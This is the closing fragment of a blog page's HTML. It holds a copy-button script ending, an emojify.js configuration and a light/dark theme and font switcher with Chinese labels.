"Copied"; window.setTimeout(function() { event.trigger.textContent = "Copy"; }, 2000); }); } }); })(jQuery); </script> 
			<script id="module-emojify">(function($) {
					$(function() {
						if (typeof emojify !== "undefined") {
							emojify.setConfig({
								img_dir: "https://cdnjs.cloudflare.com/ajax/libs//emojify.js/1.1.0/images/basic",
								blacklist: {
									"classes": ["no-emojify"],
									"elements": ["script", "textarea", "pre", "code"]
								}
							});
							emojify.run();
						} else {
							console.log("[wp-githuber-md] emogify is undefined.");
						}
					});
				})(jQuery);</script>
		<div class="skin-menu no-select">
          
  <div class="theme-controls row-container">
      <ul class="menu-list">
      <li id="white-bg" title="浅色模式">
        <i class="fa-solid fa-display fa-sm"></i>
      </li>
<!--Default-->
      <li id="dark-bg" title="深色模式">
        <i class="fa-regular fa-moon"></i>
      </li>
<!--Night-->
    </ul>
        
	<div class="font-family-controls row-container">
    <button type="button" class="control-btn-serif selected" title="切换到字体 A" data-name="serif">
      <i class="fa-solid fa-font fa-lg"></i>
    </button>
    <button type="button" class="control-btn-sans-serif" title="切换到字体 B" data-name="sans-serif">
      <i class="fa-solid fa-bold fa-lg"></i>
    </button>
  </div>
    </div>
</div>

<!-- 首页波浪特效 -->

</body>
<!-- Particles动效 -->
</html>